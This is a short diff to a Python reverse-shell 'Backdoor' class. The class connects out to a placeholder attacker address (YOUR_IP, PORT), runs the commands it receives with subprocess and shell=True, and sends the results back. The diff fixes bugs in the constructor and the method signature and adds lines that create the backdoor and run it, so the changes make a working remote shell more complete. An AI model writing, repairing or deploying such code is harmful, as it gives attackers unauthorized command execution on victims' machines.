@@ -5,10 +5,10 @@ import subprocess
 class Backdoor:
     def __init__(self, ip, port):
         self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.con.connect(("YOUR_IP", PORT))
+        self.con.connect((ip, port))
         
 
-    def exec_command(command):
+    def exec_command(self, command):
         return subprocess.check_output(command, shell=True)
 
 
@@ -19,3 +19,6 @@ class Backdoor:
             self.con.send(command_result)
 
         self.con.close()
+
+bd = Backdoor("YOUR_IP", PORT)
+bd.run()
